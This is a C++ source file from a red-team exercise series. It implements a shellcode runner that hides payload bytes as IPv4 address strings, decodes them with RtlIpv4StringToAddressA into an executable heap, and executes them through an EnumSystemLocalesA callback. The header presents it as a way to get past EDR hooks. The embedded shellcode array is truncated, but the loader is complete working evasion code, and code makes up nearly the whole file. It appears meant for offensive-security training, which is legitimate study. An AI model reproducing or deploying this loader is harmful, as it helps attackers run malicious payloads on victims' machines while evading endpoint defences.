/*
 * Red Team Exercises #61 - Shellcode via IPv4 Address Conversion
 * Author: Joas Antonio dos Santos
 * Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
 * Courses: https://courses.redteamleaders.com/
 *
 * Description:
 *   Shellcode bytes are stored as dotted-decimal IPv4 address strings.
 *   At runtime, RtlIpv4StringToAddressA() converts them back to bytes.
 *   Less commonly hooked than UuidFromStringA in most EDR configs.
 *
 * Compile: x86_64-w64-mingw32-g++ -o ipv4_runner.exe ipv4_shellcode_runner.cpp -lntdll
 * Or MSVC: cl /EHsc ipv4_shellcode_runner.cpp ntdll.lib
 */

#include <windows.h>
#include <stdio.h>
#include <ip2string.h>   // RtlIpv4StringToAddressA

#pragma comment(lib, "ntdll.lib")

// ---------------------------------------------------------------
// IPv4-encoded shellcode array
// Each string represents 4 bytes of shellcode as an IP address
// Generate with: python3 shellcode_to_ipv4.py -i payload.bin
// ---------------------------------------------------------------

const char* shellcode_ipv4[] = {
    "252.72.131.228",   // fc 48 83 e4
    "240.232.192.0",    // f0 e8 c0 00
    "0.0.65.81",        // 00 00 41 51
    "65.80.82.81",      // 41 50 52 51
    "86.72.49.210",     // 56 48 31 d2
    "72.101.72.139",    // 48 65 48 8b
    "82.96.72.139",     // 52 60 48 8b
    "82.24.72.139",     // 52 18 48 8b
    "82.32.72.139",     // 52 20 48 8b
    "114.80.72.15",     // 72 50 48 0f
    "183.74.74.77",     // b7 4a 4a 4d
    "49.201.72.49",     // 31 c9 48 31
    "192.172.60.97",    // c0 ac 3c 61
    "124.2.44.32",      // 7c 02 2c 20
    "65.193.201.13",    // 41 c1 c9 0d
    "65.1.193.226",     // 41 01 c1 e2
    // ... (truncated for brevity - use converter script for full payload)
    "0.0.0.0"
};

int num_ips = sizeof(shellcode_ipv4) / sizeof(shellcode_ipv4[0]);

// ---------------------------------------------------------------
// Decode IPv4 strings back to shellcode bytes
// ---------------------------------------------------------------

typedef NTSTATUS(NTAPI* pRtlIpv4StringToAddressA)(
    PCSTR   S,
    BOOLEAN Strict,
    PCSTR*  Terminator,
    struct in_addr* Addr
);

BOOL DecodeIPv4ToMemory(LPVOID baseAddress) {
    // Resolve RtlIpv4StringToAddressA from ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    pRtlIpv4StringToAddressA fnRtlIpv4 =
        (pRtlIpv4StringToAddressA)GetProcAddress(hNtdll, "RtlIpv4StringToAddressA");
    if (!fnRtlIpv4) {
        printf("[-] Failed to resolve RtlIpv4StringToAddressA\n");
        return FALSE;
    }

    BYTE* dest = (BYTE*)baseAddress;
    PCSTR terminator = NULL;

    for (int i = 0; i < num_ips; i++) {
        struct in_addr addr;
        NTSTATUS status = fnRtlIpv4(shellcode_ipv4[i], FALSE, &terminator, &addr);

        if (status != 0) {
            printf("[-] RtlIpv4StringToAddressA failed at index %d\n", i);
            return FALSE;
        }

        memcpy(dest, &addr, 4);
        dest += 4; // Each IPv4 = 4 bytes
    }

    printf("[+] Decoded %d IPv4 addresses (%d bytes) to 0x%p\n",
           num_ips, num_ips * 4, baseAddress);
    return TRUE;
}

// ---------------------------------------------------------------
// Execute via EnumSystemLocalesA callback
// ---------------------------------------------------------------

int main() {
    printf("[*] Red Team Exercises #61 - IPv4 Shellcode Runner\n");

    SIZE_T shellcodeSize = num_ips * 4;

    // Use HeapAlloc with executable heap
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (!hHeap) {
        printf("[-] HeapCreate failed: %lu\n", GetLastError());
        return 1;
    }

    LPVOID execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, shellcodeSize);
    if (!execMem) {
        printf("[-] HeapAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Executable heap at: 0x%p\n", execMem);

    if (!DecodeIPv4ToMemory(execMem)) {
        printf("[-] IPv4 decoding failed\n");
        return 1;
    }

    printf("[*] Triggering execution via EnumSystemLocalesA...\n");
    EnumSystemLocalesA((LOCALE_ENUMPROCA)execMem, 0);

    HeapFree(hHeap, 0, execMem);
    HeapDestroy(hHeap);
    return 0;
}
